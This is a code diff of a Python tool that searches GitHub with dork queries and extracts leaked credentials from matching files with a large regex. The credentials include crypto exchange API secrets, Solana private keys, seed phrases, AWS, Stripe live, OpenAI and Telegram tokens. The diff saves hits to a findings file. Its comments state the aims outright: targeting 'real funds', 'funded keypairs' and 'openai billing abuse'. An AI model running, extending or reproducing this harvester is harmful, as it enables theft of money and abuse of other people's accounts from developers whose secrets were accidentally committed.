@@ -14,84 +14,75 @@ HEADERS = {
 }
 
 KEY_RE = re.compile(
-    r'(AKIA[0-9A-Z]{16}'
-    r'|sk_live_[a-zA-Z0-9]{24,}'
+    r'(sk_live_[a-zA-Z0-9]{24,}'
     r'|rk_live_[a-zA-Z0-9]{24,}'
-    r'|ghp_[a-zA-Z0-9]{36}'
-    r'|gho_[a-zA-Z0-9]{36}'
-    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
     r'|AIza[0-9A-Za-z\-_]{35}'
-    r'|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----'
-    r'|(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:]\s*[A-Za-z0-9/+]{20,}'
-    r'|(?:0x[0-9a-fA-F]{64})'
+    r'|AKIA[0-9A-Z]{16}'
+    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
     r'|[0-9]{8,10}:[A-Za-z0-9_\-]{35}'
-    r'|(?:MNEMONIC|mnemonic|seed_phrase|SEED_PHRASE)\s*[=:"\s]+([a-z ]{40,})'
-    r'|(?:ETH_PRIVATE_KEY|WALLET_PRIVATE_KEY|WEB3_PRIVATE_KEY|DEPLOYER_PRIVATE_KEY)\s*[=:"\s]+(0x[0-9a-fA-F]{64}|[0-9a-fA-F]{64})'
-    r'|(?:INFURA_PROJECT_SECRET|ALCHEMY_API_KEY|MORALIS_API_KEY)\s*[=:"\s]+([A-Za-z0-9_\-]{20,})'
+    r'|(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|binance_secret)\s*[=:"\s]+([A-Za-z0-9]{40,})'
+    r'|(?:BYBIT_API_SECRET|bybit_secret)\s*[=:"\s]+([A-Za-z0-9]{36,})'
+    r'|(?:OKX_SECRET_KEY|okx_secret|OKX_API_SECRET)\s*[=:"\s]+([A-Za-z0-9\-]{30,})'
+    r'|(?:KUCOIN_API_SECRET|kucoin_secret)\s*[=:"\s]+([a-f0-9\-]{30,})'
+    r'|(?:MEXC_SECRET_KEY|mexc_secret)\s*[=:"\s]+([A-Za-z0-9]{30,})'
+    r'|(?:SOLANA_PRIVATE_KEY|SOL_PRIVATE_KEY|ANCHOR_WALLET)\s*[=:"\s]+([1-9A-HJ-NP-Za-km-z]{87,88})'
+    r'|(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:"\s]+([A-Za-z0-9/+]{40})'
+    r'|(?:MNEMONIC|mnemonic|SEED_PHRASE)\s*[=:"]+\s*([a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z][a-z ]*)'
     r'|(?:STRIPE_SECRET_KEY|STRIPE_LIVE_SECRET)\s*[=:"\s]+(sk_live_[A-Za-z0-9]{24,})'
     r'|(?:OPENAI_API_KEY)\s*[=:"\s]+(sk-[A-Za-z0-9]{32,})'
-    r'|(?:TWILIO_AUTH_TOKEN)\s*[=:"\s]+([a-f0-9]{32})'
     r'|(?:TELEGRAM_BOT_TOKEN|BOT_TOKEN)\s*[=:"\s]+([0-9]{8,10}:[A-Za-z0-9_\-]{35})'
-    r'|(?:privateKey|private_key)\s*[=:"\s]+(0x[0-9a-fA-F]{64}))',
+    r'|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----)',
     re.IGNORECASE
 )
 
 DORKS = [
-    # crypto — highest value
-    'filename:.env ETH_PRIVATE_KEY',
-    'filename:.env WALLET_PRIVATE_KEY',
-    'filename:.env DEPLOYER_PRIVATE_KEY',
-    'filename:.env WEB3_PRIVATE_KEY',
-    'filename:.env MNEMONIC',
-    'filename:.env INFURA_PROJECT_SECRET',
-    'filename:.env ALCHEMY_API_KEY',
-    'filename:hardhat.config.js privateKey 0x',
-    'filename:truffle-config.js privateKey',
-    'filename:.env MORALIS_API_KEY',
+    # exchange API keys — highest probability of real funds
+    'filename:.env BINANCE_SECRET_KEY',
+    'filename:.env BINANCE_API_SECRET',
+    'filename:.env BYBIT_API_SECRET',
+    'filename:.env OKX_SECRET_KEY',
+    'filename:.env KUCOIN_API_SECRET',
+    'filename:.env MEXC_SECRET_KEY',
+    'filename:.env GATE_API_SECRET',
+    'filename:.env KRAKEN_API_PRIVATE_KEY',
+    'filename:.env HUOBI_SECRET_KEY',
+    'filename:config.json api_secret binance',
+    'filename:config.py BINANCE_SECRET',
+    'filename:.env API_SECRET exchange',
+    # solana — devs commit real funded keypairs
+    'filename:.env SOLANA_PRIVATE_KEY',
+    'filename:.env ANCHOR_WALLET',
+    'filename:keypair.json secretKey',
+    'filename:.env SOL_PRIVATE_KEY',
+    'filename:.env WALLET_PRIVATE_KEY solana',
     # stripe live
     'filename:.env STRIPE_SECRET_KEY sk_live',
     'filename:.env sk_live_',
-    'sk_live_ filename:.env',
-    # aws
+    'filename:.env.production STRIPE',
+    # telegram payment bots
+    'filename:.env TELEGRAM_BOT_TOKEN payment',
+    'filename:.env BOT_TOKEN STRIPE',
+    'filename:bot.py TOKEN STRIPE',
+    # aws with real usage
     'filename:.env AWS_SECRET_ACCESS_KEY',
-    'filename:.env AKIA',
-    'AWS_SECRET_ACCESS_KEY filename:.env.local',
-    # github PAT
-    'filename:.env GITHUB_TOKEN ghp_',
-    'filename:.env GH_TOKEN ghp_',
-    # telegram bots
-    'filename:.env TELEGRAM_BOT_TOKEN',
-    'filename:.env BOT_TOKEN',
-    'filename:config.py bot_token',
-    # openai
+    'filename:.env.production AWS_SECRET',
+    'filename:.env.local AWS_SECRET_ACCESS_KEY',
+    # real mnemonics in bot/trading repos
+    'filename:.env MNEMONIC phrase',
+    'filename:config.json mnemonic',
+    'filename:.env SEED_PHRASE',
+    # openai billing abuse
     'filename:.env OPENAI_API_KEY',
     'filename:.env.local OPENAI_API_KEY',
-    # docker exposed secrets
-    'filename:docker-compose.yml POSTGRES_PASSWORD',
-    'filename:docker-compose.yml MYSQL_ROOT_PASSWORD',
-    'filename:docker-compose.yml SECRET_KEY',
-    'filename:docker-compose.yml AWS_SECRET',
-    'filename:docker-compose.yml STRIPE_SECRET',
-    # firebase
-    'filename:service-account.json private_key',
-    'filename:firebase-adminsdk.json private_key',
-    # twilio
-    'filename:.env TWILIO_AUTH_TOKEN',
-    # slack
-    'filename:.env SLACK_BOT_TOKEN xoxb',
-    'xoxb- filename:.env',
-    # google api
+    'filename:.env.production OPENAI_API_KEY',
+    # google with billing
     'filename:.env GOOGLE_API_KEY AIza',
-    'AIzaSy filename:.env',
-    # ssh keys in repos
-    'filename:id_rsa BEGIN RSA PRIVATE KEY',
-    'filename:id_ed25519 BEGIN OPENSSH PRIVATE KEY',
-    # database urls with creds
-    'filename:.env DATABASE_URL postgres://',
-    'filename:.env DATABASE_URL mysql://',
-    # general catch
-    'filename:.env.production SECRET_KEY',
-    'filename:.env.production API_KEY',
+    'filename:.env GOOGLE_MAPS_API_KEY',
+    'filename:.env FIREBASE_PRIVATE_KEY',
+    # crypto trading bot configs
+    'filename:config.json api_key api_secret crypto',
+    'filename:.env EXCHANGE_API_SECRET',
+    'filename:.env TRADING_BOT_SECRET',
 ]
 
 # load seen set
@@ -126,7 +117,7 @@ new_seen = []
 
 for dork in DORKS:
     print(f'\nDORK: {dork}', flush=True)
-    for page in range(1, 3):  # 2 pages x 100 = 200 candidates per dork
+    for page in range(1, 3):
         result = search(dork, page)
         if not result:
             break
@@ -160,7 +151,7 @@ for dork in DORKS:
             if not content:
                 continue
 
-            secrets = list(set(m.group(0)[:150] for m in KEY_RE.finditer(content)))
+            secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(content)))
             if secrets:
                 entry = {
                     'url': html_url,
@@ -180,7 +171,7 @@ for dork in DORKS:
     time.sleep(1)
 
 print(f'\nTotal hits: {len(findings)}', flush=True)
-print(f'New candidates scanned this run: {len(new_seen)}', flush=True)
+print(f'New candidates scanned: {len(new_seen)}', flush=True)
 
 with open('gh_findings.jsonl', 'w') as f:
     for r in findings:
